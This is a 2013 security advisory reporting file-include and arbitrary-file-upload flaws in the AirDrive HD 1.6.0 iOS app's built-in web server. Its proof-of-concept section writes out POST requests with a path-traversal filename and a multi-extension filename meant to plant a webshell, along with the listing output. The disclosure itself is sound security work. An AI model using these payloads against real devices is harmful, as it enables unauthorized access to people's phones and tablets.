Title:
======
AirDrive HD 1.6 iPad iPhone - Multiple Web Vulnerabilities


Date:
=====
2013-02-24


References:
===========
http://www.vulnerability-lab.com/get_content.php?id=865


VL-ID:
=====
865


Common Vulnerability Scoring System:
====================================
6.3


Introduction:
=============
AirDrive HD - your personal wireless flash disk. Safely send any file to your device over the air directly through
your favorite browser or FTP client! No more wires and painful syncs! With AirDrive HD you can store and transfer files
from one computer to another using your iPad, and intuitive interface make it easy and enjoyable occupation.

- transfer files via FTP;
- interact with the Photos app;
- share files with other devices via bluetooth;
- view and listen to media content;
- open documents;
- import and export files to other applications;
- send files by e-mail;
- rename, copy, move and delete files or folders;
- share files with your computer via iTunes File Sharing;
- unpack ZIP and RAR archives;

( Copy of the Vendor Homepage: https://itunes.apple.com/de/app/airdrive-hd-wireless-flash/id484724740 )


Abstract:
=========
The Vulnerability Laboratory Research Team discovered an arbitrary file upload vulnerability in the mobile AirDrive HD v1.6.0 app for the apple ipad & iphone.


Report-Timeline:
================
2013-02-24:	Public Disclosure


Status:
========
Published


Affected Products:
==================
Apple AppStore
Product: AirDrive HD 1.6.0


Exploitation-Technique:
=======================
Remote


Severity:
=========
Critical


Details:
========
A local file include and arbitrary file upload web vulnerability via POST request method is detected in the mobile AirDrive HD v1.6.0
app for the apple ipad & iphone. The vulnerability allows remote attackers via POST method to inject local app webserver folders to
request unauthorized local webserver files.

1.1
The main vulnerbility is located in the upload file formular of the webserver (http://192.168.0.10:8080) when processing to load a manipulated
filename via POST request method. The execution of the injected path or file request will occur when the attacker is watching the file index listing
of the wifi web application web-server.

1.2
Remote attackers can also unauthorized implement mobile webshells by using multiple file extensions (pentest.php.js.gif) when processing to
upload (submit) via POST request method. The attacker uploads a file with a double extension and access the file in the secound step via directory
webserver dir listing to compromise the apple iphone or ipad.

Exploitation of the local file include web vulnerability does not require user interaction and also no privileged user account.
Successful exploitation of the web vulnerabilities results in app/service manipulation and ipad or iphone compromise via file
include or unauthorized file (webshell) upload attacks.


Vulnerable Application(s):
				[+] AirDrive HD v1.6.0 - ITunes or AppStore (Apple)

Vulnerable Module(s):
				[+] File Upload via Submit (Web Server) [Remote]

Vulnerable Parameter(s):
				[+] file > filename

Affected Module(s):
				[+] File Dir Index - Listing


Proof of Concept:
=================
Both vulnerabilities can be exploited by remote attackers without privileged application user account and also without required user interaction.
For demonstration or reproduce ...

1.1
PoC: (POST)
-----------------------------117943051125692
Content-Disposition: form-data; name="file";
filename=">"../../../../cmd>home>tmp.png"
Content-Type: image/png
����


Review: Listing - Index

<p class="name"><strong><a href="http://192.168.0.10:8080/">...</a></strong></p><p class="size"> </p>
<div style="clear:both;"><p class="name"><strong><a href="http://192.168.0.10:8080/Imported%20photos/">Imported photos/</a></strong></p>
<p class="size"> </p><div style="clear:both;"><p class="name" style="text-indent:20px;">
<a href="http://192.168.0.10:8080/>"../../../../cmd>home>tmp>%20%20%20%20</a></p><p



1.2
PoC: (POST)
-----------------------------117943051125691
Content-Disposition: form-data; name="file";
filename="pentest.php.js.html.gif"			# < Include File with multiple file extensions - POST
Content-Type: image/gif
����


Review: Listing - Index

<p class="name"><strong><a href="http://192.168.0.10:8080/">...</a></strong></p><p class="size"> </p>
<div style="clear:both;"><p class="name"><strong><a href="http://192.168.0.10:8080/Imported%20photos/">Imported photos/</a></strong></p>
<p class="size"> </p><div style="clear:both;"><p class="name" style="text-indent:20px;">
<a href="http://192.168.0.10:8080/pentest.php.js.html.gif%20%20%20%20</a></p><p     # < Imported file with multiple extensions - Listing



Reference(s):
Insert: 	http://192.168.0.10:8080/
Affected: 	http://192.168.0.10:8080/Imported%20photos/


Risk:
=====
The security risk of the arbitrary file upload web vulnerability via POST request method is estimated as critical.


Credits:
========
Vulnerability Laboratory [Research Team]  -    Benjamin Kunz Mejri (bkm@vulnerability-lab.com)


Disclaimer:
===========
The information provided in this advisory is provided as it is without any warranty. Vulnerability-Lab disclaims all warranties,
either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-
Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business
profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some
states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation
may not apply. We do not approve or encourage anybody to break any vendor licenses, policies, deface websites, hack into databases
or trade with fraud/stolen material.

Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       - www.vulnerability-lab.com/register
Contact:    admin@vulnerability-lab.com 	- support@vulnerability-lab.com 	       - research@vulnerability-lab.com
Section:    video.vulnerability-lab.com 	- forum.vulnerability-lab.com 		       - news.vulnerability-lab.com
Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       - youtube.com/user/vulnerability0lab
Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   - vulnerability-lab.com/rss/rss_news.php

Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory.
Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other
media, are reserved by Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, sourcecode, videos and
other information on this website is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed),
modify, use or edit our material contact (admin@vulnerability-lab.com or support@vulnerability-lab.com) to get a permission.

    				   	Copyright � 2013 | Vulnerability Laboratory

--
VULNERABILITY RESEARCH LABORATORY
LABORATORY RESEARCH TEAM
CONTACT: research@vulnerability-lab.com